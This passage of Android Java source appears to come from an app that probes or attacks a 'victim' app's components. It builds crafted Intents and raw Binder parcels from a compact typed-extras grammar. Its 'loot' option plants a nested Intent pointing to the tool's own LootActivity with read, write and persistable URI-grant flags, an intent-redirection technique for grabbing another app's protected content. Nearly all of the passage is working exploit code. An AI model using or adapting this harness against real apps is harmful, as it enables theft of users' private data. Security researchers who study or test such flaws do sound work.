        return new ComponentName(victim, c.startsWith(".") ? victim + c : c);
    }

    /**
     * Typed-extras grammar (one string, entries separated by ';'):  name:type=value
     *   s string · i int · l long · z boolean · f float · d double · u Uri (parcelable) · b64 byte[] · sa string[] (comma)
     *   ia int[] (comma) · intent nested Intent (value = component pkg/cls, or "loot" = our LootActivity with the
     *   --es uri as data and read/write grant flags; "loot?action=X" sets its action) · bundle nested Bundle whose value
     *   is the same grammar with ',' between entries and '|' instead of '='.
     * Example: --es extras "url:s=https://x/;n:i=3;ok:z=true;f:u=content://a/b;cb:intent=loot;raw:b64=AAEC"
     */
    void putTyped(Intent i, String spec) {
        for (String e : spec.split(";")) {
            e = e.trim(); if (e.isEmpty()) continue;
            int colon = e.indexOf(':'), eq = e.indexOf('=', colon < 0 ? 0 : colon);
            if (colon < 0 || eq < 0) { i.putExtra(e, ""); p("extras", "entry=" + e, "note=no type; put as empty string"); continue; }
            String k = e.substring(0, colon), t = e.substring(colon + 1, eq), v = e.substring(eq + 1);
            try {
                switch (t) {
                    case "s": i.putExtra(k, v); break;
                    case "i": i.putExtra(k, Integer.decode(v)); break;
                    case "l": i.putExtra(k, Long.decode(v)); break;
                    case "z": i.putExtra(k, Boolean.parseBoolean(v)); break;
                    case "f": i.putExtra(k, Float.parseFloat(v)); break;
                    case "d": i.putExtra(k, Double.parseDouble(v)); break;
                    case "u": i.putExtra(k, Uri.parse(v)); break;
                    case "b64": i.putExtra(k, Base64.decode(v, Base64.DEFAULT)); break;
                    case "sa": i.putExtra(k, v.split(",")); break;
                    case "ia": { String[] xs = v.split(","); int[] n = new int[xs.length]; for (int q = 0; q < xs.length; q++) n[q] = Integer.decode(xs[q].trim()); i.putExtra(k, n); break; }
                    case "intent": i.putExtra(k, nested(v)); break;
                    case "bundle": { Bundle b = new Bundle(); Intent tmp = new Intent(); putTyped(tmp, v.replace(',', ';').replace('|', '=')); if (tmp.getExtras() != null) b.putAll(tmp.getExtras()); i.putExtra(k, b); break; }
                    default: i.putExtra(k, v); p("extras", "entry=" + e, "note=unknown type " + t + "; put as string");
                }
            } catch (Throwable x) { p("extras", "entry=" + e, "failed=" + x); }
        }
    }
    Intent nested(String v) {
        Intent n = new Intent();
        if (v.startsWith("loot")) {
            n.setClassName(getPackageName(), LootActivity.class.getName());
            if (uri != null) n.setData(Uri.parse(uri));
            n.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
            int q = v.indexOf("?action="); if (q > 0) n.setAction(v.substring(q + 8));
        } else n.setComponent(comp(v));
        return n;
    }
    /** Same grammar, written straight into a Parcel for transact() — in order, no keys. */
    void writeTyped(Parcel d, String e) {
        e = e.trim(); if (e.isEmpty()) return;
        int colon = e.indexOf(':'), eq = e.indexOf('=', colon < 0 ? 0 : colon);
        if (colon < 0 || eq < 0) { d.writeString(e); return; }
        String t = e.substring(colon + 1, eq), v = e.substring(eq + 1);
        try {
            switch (t) {
                case "i": d.writeInt(Integer.decode(v)); break;
                case "l": d.writeLong(Long.decode(v)); break;
                case "z": d.writeInt(Boolean.parseBoolean(v) ? 1 : 0); break;
                case "f": d.writeFloat(Float.parseFloat(v)); break;
                case "d": d.writeDouble(Double.parseDouble(v)); break;
                case "u": Uri.writeToParcel(d, Uri.parse(v)); break;
                case "b64": d.writeByteArray(Base64.decode(v, Base64.DEFAULT)); break;
                case "intent": d.writeInt(1); nested(v).writeToParcel(d, 0); break;
                default: d.writeString(v);
            }
        } catch (Throwable x) { p("bind", "parcel_entry=" + e, "failed=" + x); }
    }

    // ── plumbing ──
    void async() { pendingAsync++; }
    void done() { pendingAsync--; ui.post(this::maybeFinish); }
    void maybeFinish() { if (finishWhenDone && pendingAsync <= 0) finish(); }
    void btn(LinearLayout bar, String label, View.OnClickListener l) {
        Button b = new Button(this); b.setText(label); b.setAllCaps(false); b.setTextSize(11); b.setOnClickListener(l); bar.addView(b);
    }
    void p(String step, String... kv) {
        final String line = Probe.log(this, "PROBE|" + step + "|" + String.join("|", Arrays.asList(kv)));
        runOnUiThread(() -> { log.append(line + "\n"); scroll.post(() -> scroll.fullScroll(View.FOCUS_DOWN)); });
    }
}
